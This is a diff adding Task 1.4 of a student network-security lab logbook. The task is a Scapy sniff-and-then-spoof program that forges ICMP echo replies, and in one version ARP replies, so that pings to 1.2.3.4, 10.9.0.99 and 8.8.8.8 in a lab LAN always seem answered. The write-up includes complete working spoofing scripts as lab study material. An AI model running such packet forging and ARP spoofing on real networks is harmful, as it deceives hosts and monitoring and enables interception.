@@ -155,7 +155,13 @@ We can conclude that we needed 21 routers (TTL=21) until it got to the destinati
 ![pings](../docs/logbook13/pings_updated.png)
 
 
-# Task 1.4
+# Task 1.4: Sniffing and-then Spoofing
+
+## Context
+
+"In this task, you will combine the sniffing and spoofing techniques to implement the following sniff-andthen-spoof program. You need two machines on the same LAN: the VM and the user container. From the user container, you ping an IP X. This will generate an ICMP echo request packet. If X is alive, the ping program will receive an echo reply, and print out the response. Your sniff-and-then-spoof program runs on the VM, which monitors the LAN through packet sniffing. Whenever it sees an ICMP echo request, regardless of what the target IP address is, your program should immediately send out an echo reply using the packet spoofing technique. Therefore, regardless of whether machine X is alive or not, the ping program will always receive a reply, indicating that X is alive".
+
+
 
 For this task the objective was to implement a sniff-and-then-spoof program using Scapy. The program was designed to run on a virtual machine (VM) monitoring a local area network (LAN).
 
@@ -180,15 +186,127 @@ For this task the objective was to implement a sniff-and-then-spoof program usin
         - The spoofing program responded to ICMP echo requests for any target IP address, including non-existing hosts.
         - ARP protocol was likely involved. When the user container sent a ping to a non-existing host, it broadcasted an ARP request on the LAN. The VM's sniff-and-spoof program intercepted this request and responded with a spoofed echo reply.
 
+For this task, we used the following code:
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+
+def spoof_packet(p):
+    if ICMP in p and p[ICMP].type == 8:
+        print("Original Packet BEfore Spoofing")
+        print("Source IP: ", p[IP].src)
+        print("Destination IP: ", p[IP].dst)
+        ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl)
+        icmp = ICMP(type=0, id=p[ICMP].id, seq=p[ICMP].seq)
+        data = p[Raw].load
+        newp = ip/icmp/data
+
+        print("Spoofed Packet")
+        print("Source IP: ", newp[IP].src)
+        print("Destination IP: ", newp[IP].dst)
+
+        send(newp, verbose=0)
+
+filter = 'icmp and host 1.2.3.4'
+p = sniff(iface='br-cf370a106790', filter=filter, prn=spoof_packet)
+```
+
+And we got the following results, meaning success:
+
+![task1.4_1.2.3.4](../docs/logbook13/task1.4_ping1.2.3.4_1.png)
+
+![task1.4_1.2.3.4](../docs/logbook13/task1.4_ping1.2.3.4_2.png)
+
+
 ### 2. Pinging 10.9.0.99 (Non-existing host on the LAN):
    - **Explanation:**
         - The program responded to all ICMP echo requests, regardless of the target's existence on the LAN.
         - ARP requests triggered by the ping to a non-existing LAN host were intercepted and spoofed by the program.
 
+For this task, we used the following code:
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+
+def spoof_packet(pkt):
+    if ICMP in pkt and pkt[ICMP].type == 8:
+        print("Original Packet Before Spoofing")
+        print("Source IP: ", pkt[IP].src)
+        print("Destination IP: ", pkt[IP].dst)
+
+        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+        icmp = ICMP(type='echo-reply', id=pkt[ICMP].id, seq=pkt[ICMP].seq)
+        data = pkt[Raw].load
+        new_pkt = ip/icmp/data
+
+        print("Spoofed Packet")
+        print("Source IP: ", new_pkt[IP].src)
+        print("Destination IP: ", new_pkt[IP].dst)
+
+        send(new_pkt, verbose=0)
+
+    elif ARP in pkt and pkt[ARP].op == 1:
+        print("ARP Request")
+        hwlen = 6
+        plen = 4
+        op = 2
+        pdst = pkt[ARP].psrc
+        hwdst = pkt[ARP].hwsrc
+        psrc = pkt[ARP].pdst
+        arp = ARP(hwlen=hwlen, plen=plen, op=op, pdst=pdst, hwdst=hwdst, psrc=psrc)
+
+        send(arp, verbose=0)
+
+filter = 'icmp and host 10.9.0.99 or arp' 
+p = sniff(iface='br-cf370a106790', filter=filter, prn=spoof_packet)
+```
+
+And we got these results:
+
+![task1.4_10.9.0.99_1](../docs/logbook13/task1.4_10.9.0.99_1.png)
+
+![task1.4_10.9.0.99_2](../docs/logbook13/task1.4_10.9.0.99_2.png)
+
+This code is different compared to the other two, because using the previous code did not work for this one. For that reason, we added a block of code to handle arp requests, spoofing arp replies and the uppon sucess of this task.
+
 ### 3. Pinging 8.8.8.8 (Existing host on the Internet):
    - **Explanation:**
         - The program's response to ICMP echo requests did not depend on the actual existence of the target host.
         - The ARP protocol and routing information were likely utilized to correctly handle the requests and provide consistent responses.
+
+For this task, we used the following code:
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+
+def spoof_packet(p):
+    if ICMP in p and p[ICMP].type == 8:
+        print("Original Packet BEfore Spoofing")
+        print("Source IP: ", p[IP].src)
+        print("Destination IP: ", p[IP].dst)
+        ip = IP(src=p[IP].dst, dst=p[IP].src, ihl=p[IP].ihl)
+        icmp = ICMP(type=0, id=p[ICMP].id, seq=p[ICMP].seq)
+        data = p[Raw].load
+        newp = ip/icmp/data
+
+        print("Spoofed Packet")
+        print("Source IP: ", newp[IP].src)
+        print("Destination IP: ", newp[IP].dst)
+
+        send(newp, verbose=0)
+
+filter = 'icmp and host 8.8.8.8' # filter 2
+p = sniff(iface='br-cf370a106790', filter=filter, prn=spoof_packet)
+```
+
+And we got these results:
+
+![task1.4_8.8.8.8](../docs/logbook13/task1.4_8.8.8.8_1.png)
+
+![task1.4_8.8.8.8](../docs/logbook13/task1.4_8.8.8.8_2.png)
+
+As we can see, we got duplicated packets since they are being received simultaneously by the google server and our program.
+
 
 ## Conclusion:
 The experiment demonstrated that the sniff-and-then-spoof program successfully manipulated the ICMP echo requests on the LAN, consistently generating spoofed echo replies regardless of the target's actual existence. This highlights the vulnerability of relying solely on ICMP echo replies for network availability assessment and emphasizes the importance of securing against such spoofing attacks.
